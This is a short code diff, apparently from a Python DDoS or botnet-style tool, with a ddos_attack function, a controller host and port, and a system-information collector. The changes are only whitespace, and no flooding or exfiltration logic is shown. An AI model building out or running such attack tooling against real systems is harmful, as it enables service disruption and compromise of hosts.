@@ -120,7 +120,7 @@ def ddos_attack():
     print("\nAttack Stopped")
 
 if __name__ == "__main__":
-    ddos_attack()
+  ddos_attack()
 
 
 
@@ -181,7 +181,7 @@ CONTROLLER_HOST = '127.0.0.1'
 CONTROLLER_PORT = 55555
 
 def get_system_info():
-    return f"OS: {platform.system()} {platform.release()}, Node: {platform.node()}"
+    return f"OS: {platform.system()} {platform.release()}, Node:{platform.node()}"
 
 def get_timestamp():
     return f"Timestamp: {time.ctime()}"
